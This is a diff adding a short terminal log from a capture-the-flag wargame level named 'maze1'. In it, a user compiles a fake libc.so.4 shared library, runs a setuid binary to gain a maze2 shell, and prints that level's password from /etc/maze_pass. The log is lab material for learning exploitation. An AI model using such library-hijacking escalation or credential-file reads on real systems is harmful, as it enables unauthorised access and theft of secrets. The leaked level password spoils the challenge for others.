@@ -1,0 +1,17 @@
+maze1@maze:/tmp/tdaddy$ gcc -m32 -D_GNU_SOURCE -fPIC -shared -o libc.so.4 -ldl libc2.c
+maze1@maze:/tmp/tdaddy$ /maze/maze1
+$ whoami
+maze2
+$ ls -lha
+total 56K
+drwxrwxrwx   2 maze1 root  4.0K Jun 24 23:50 .
+drwxrws-wt 661 root  root   24K Jun 25 00:05 ..
+-rw-r--r--   1 maze1 maze1  110 Jun 24 23:49 libc.c
+-rwxr-xr-x   1 maze1 maze1 6.9K Jun 24 23:50 libc.so.4
+-rw-r--r--   1 maze1 maze1  232 Jun 24 23:50 libc2.c
+-rwxr-xr-x   1 maze1 maze1 6.9K Jun 24 23:50 puts-override.so
+$ cat /etc/maze_pass/maze2
+fooghihahr
+$ quit
+sh: 4: quit: not found
+$ exit
